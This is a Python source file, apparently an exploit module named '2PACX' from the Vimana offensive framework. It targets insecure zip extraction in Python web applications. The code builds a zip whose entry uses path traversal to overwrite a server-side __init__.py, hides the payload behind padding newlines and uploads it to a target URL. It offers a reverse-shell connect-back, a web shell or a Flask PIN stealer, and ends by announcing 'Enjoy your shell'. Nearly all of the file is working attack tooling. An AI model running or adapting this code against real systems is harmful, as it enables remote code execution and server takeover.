# -*- coding: utf-8 -*-
"""
             _   _   _   _   _   _  
            / \ / \ / \ / \ / \ / \ 
        ((-( V | 1 | M | 4 | N | 4 )-))
            \_/ \_/ \_/ \_/ \_/ \_/ 

                    - 2PACX -

    Unsecure Zip File Extraction Exploit
    s4dhu <s4dhul4bs[at]prontonmail[dot]ch

"""

from core.vmnf_payloads import VMNFPayloads
from core.vmnf_shared_args import VimanaSharedArgs
from res import colors
from res.stage import stager

import sys, re, os, random, string, platform
from mimesis import Generic
import zipfile, json, requests
import collections 
from termcolor import colored, cprint
from html.parser import HTMLParser
from urllib.parse import urlsplit,urlparse
from datetime import datetime
from time import sleep
import argparse
    

class siddhi:  
    module_information = collections.OrderedDict() 
    module_information = {
        "Name":         "2PACX",
        "Info":         "Unsecure Zip File Extraction Exploit",
        "Category":     "Package",
        "Framework":    "Generic",
        "Type":         "Exploit",
        "Module":       "siddhis/2pacx/",
        "Author":       "s4dhu <s4dhul4bs[at]prontonmail[dot]ch",
        "Brief":        "Remote code execution via insecure file extraction", 
        "Package":      "Zipfile",
        "Description":  
        """

        \r  The vulnerability occurs when a zipped file is sent to a Python application 
        \r  that uses the zipfile.ZipInfo() method from the zipfile[1] library to obtain 
        \r  the information necessary to perform the server side extraction.

        \r  In this scenario, an attacker can manipulate a specially created .zip file, 
        \r  in which the filename (fileinfo.filename) is configured, via path traversal 
        \r  (eg: '../config/__init__.py'), by setting an arbitrary location for record 
        \r  the contents of the malicious zip file[2][3]. 
        
        \r  The goal of the exploit is to subscribe to the content of some __init__.py file 
        \r  (zipfile.ZipInfo.writestr()) within any directory of the exploited application.

        \r  Note that there are numerous particularities necessary for this flaw to be exploited, 
        \r  one of which is the fact that the payload sent will only be executed immediately 
        \r  in cases where the Python application (Flask/Django) is running with DEBUG true, 
        \r  otherwise the payload will only be triggered when the server restarts.

        \r  Another important point is that it is necessary that the directory specified 
        \r  in the filename of the sent zip exists on the server with an __init__.py file.

        \r  References:

        \r  [1] https://docs.python.org/2/library/zipfile.html#zipfile.ZipInfo
        \r  [2] https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution 
        \r  [3] https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/358
        """

    }
    
    # help to 'args' command in main vimana board: vimana args --module dmt
    module_arguments = VimanaSharedArgs().shared_help.__doc__

    def __init__(self, **vmnf_handler):
        self.vmnf_handler = vmnf_handler
        self.commom_py_app_dirs = [
            'config', 'scripts', 'controllers', 'modules', 
            'conf', 'bkp', 'settings', 'utils', 
            'urls', 'view', 'tests', 'models', 
            'admin', 'login'
        ]
        
    def parse_args(self):
        ''' ~ siddhi needs only shared arguments from VimanaSharedArgs() ~'''
        parser = argparse.ArgumentParser(
                add_help=False,
                parents=[VimanaSharedArgs().args()]
        )
        return parser

    def build_malzipfile(self):
        

        '''
        --target-url 
        --target-dir
        --local-port
        --remote-port
        --local-host
        --filename 
        --payload
        '''
        session = self.vmnf_handler.get('foward_session')
        g = Generic()
        payload_type = False
        xpl_hl = colored('2pacx', 'blue')
        pay_refs = VMNFPayloads()._vmnfp_payload_types_(True).keys()
        pay_refs = ([i.split('_')[0] for i in [k for k in pay_refs]] + \
                            [k for k in pay_refs])

        if not self.vmnf_handler['payload_type']:
            print("[{}] → Auto setting payload type Python one-liner connect back on port {}".format(
                        xpl_hl,self.vmnf_handler['local_port'])
            )
            payload_type = 'olpcb_payload'
        

        elif self.vmnf_handler['payload_type'] not in pay_refs:
            print("[{}] → Invalid payload type! Choose an option below:\n".format(xpl_hl))
            VMNFPayloads()._vmnfp_payload_types_(False,False)    
            
            payload_type = input("[{}] (Payload) → ".format(xpl_hl))
            if not payload_type or payload_type not in pay_refs:
                print("[{}] → Nothing to do, leaving the ship ...\n".format(xpl_hl))
                sleep(1)
                sys.exit(1)
        else:
            payload_type = self.vmnf_handler['payload_type']

        # one-liner python connectback payload
        if payload_type in ['olpcb_payload', 'olpcb']:
            if not self.vmnf_handler['local_port']:
                hl_arg = colored('--local-port', 'red')
                print('[{}] → Missing required {} argument.\n'.format(xpl_hl,hl_arg))
                return False
            if not self.vmnf_handler['local_host']:
                hl_arg = colored('--local-host', 'red')
                print('[{}] → Missing required {} argument.\n'.format(xpl_hl,hl_arg))
                return False

            payload = VMNFPayloads(**self.vmnf_handler).olpcb_payload()
        
        # python web shell payload
        elif payload_type in ['pws_payload','pws']:
            self.vmnf_handler['xpl_cmd_var'] = str(g.person.title().replace('.','') + \
                g.person.first_name() + g.text.word().title() + \
                    g.person.occupation().replace(' ','_'))
            
            remote_port = self.vmnf_handler.get('remote_port')
            #if not self.vmnf_handler['remote_port']:
            if not remote_port:
                remote_port = input('[{}] → Missing remote port! Inform the port or enter to choose automatically:  '.format(xpl_hl))
                if not remote_port:
                    remote_port =  g.internet.port()
                    opt_rport = input('[{}] → Random port chosen: {} Confirm (Y/n): '.format(xpl_hl, colored(remote_port,'green')))
                    if not opt_rport or opt_rport.lower() == 'y':
                        self.vmnf_handler['remote_port'] = remote_port
                    else:
                        print("[{}] → Nothing to do, leaving the ship ...\n".format(xpl_hl))
                        sleep(1)
                        sys.exit(1)
            
            payload = VMNFPayloads(**self.vmnf_handler).pws_payload()
        
        elif payload_type == 'flask_pinstealer':
            payload = VMNFPayloads(**self.vmnf_handler).flask_pinstealer()
            
        target_dir = self.vmnf_handler['target_dir']
        if not target_dir:
            target_dir = input("[{}] → Specify the directory to deploy or enter for auto selection (common dirs): ".format(xpl_hl))
            if not target_dir:
                target_dir = random.choice(self.commom_py_app_dirs)
        else:
            target_dir = self.vmnf_handler['target_dir']
        
        print("[{}] → Using target '{}/__init__.py' to deploy".format(xpl_hl, target_dir))
        sleep(1)

        print('[{}] → Payload: {}'.format(xpl_hl, colored(payload,'green')))
        sleep(1)


        if not self.vmnf_handler['filename']:
            filename = g.text.random.randstr()[:12] 
        else:
            filename = self.vmnf_handler['filename']

        print("[{}] → Building malicious zipfile: {}.zip...".format(xpl_hl,filename))
        sleep(1)
        
        payload = ('\n'*100 + str(payload))
        zip_file = str(filename) + ".zip"
        z_info = zipfile.ZipInfo(r"../{}/__init__.py".format(target_dir))
        z_file = zipfile.ZipFile('/tmp/' + zip_file, mode="w")
        z_file.writestr(z_info, payload)
        z_info.external_attr = 0o777 << 16                  
        z_file.close()
        
        print("[{}] → Uploading {} to {}...".format(xpl_hl,filename, self.vmnf_handler['target_url']))
        sleep(1)
        
        if session: 
            print("[{}] → Forward is enabled, start {} in another terminal:\n\t run --module {} --session and hit Enter here.".format(
                xpl_hl,self.vmnf_handler.get('foward_session'),session
                )
            )
            
            stager(**self.vmnf_handler).forward_session()
            s=input()

       
        try:
            # stages were introduced to manage some new payloads:fps
            stages = 3 if payload_type == 'flask_pinstealer' else 2
            for stage in range(1,stages): 
                print("[{}]   + Sending {} stage {}/{}...".format(
                    xpl_hl,
                    self.vmnf_handler['payload_type'],
                    stage,
                    stages - 1
                    )
                )
                
                sleep(10)
                zip_ = open('/tmp/' + zip_file, 'rb')
                files = {'file': zip_}
                upload = requests.post(
                self.vmnf_handler['target_url'],files=files)
        except requests.exceptions.ConnectionError:
            # maybe server is up or not running on a given port 
            print("[{}] → Could not upload the exploit. Make sure that --target-url parameter is correct...".format(
                    colored('2pacx','red')))
            sys.exit(1)

        if upload.status_code == 200:
            inf = ')'
            if payload_type in ['pws','pws_payload']:
                t_url = urlparse(self.vmnf_handler['target_url'])
                pws_url = t_url.scheme + '://' + t_url.netloc.split(':')[0] \
                        + ':' + str(remote_port) + '/?' \
                        + self.vmnf_handler['xpl_cmd_var'] + '=id'
                
                inf = colored(pws_url,'green')

            print('[{}] → Success! Enjoy your shell: {}'.format(xpl_hl,inf))
        else:
            print('[{}] → It looks like something went wrong / The server responded with {}'.format(xpl_hl,upload.status_code))

    def start(self):
        # required argument for all available payloads
        if not self.vmnf_handler['target_url']:
            print('[2pacx] → Missing {} argument.\n'.format(colored('--target-url','red')))
            return False

        self.build_malzipfile()
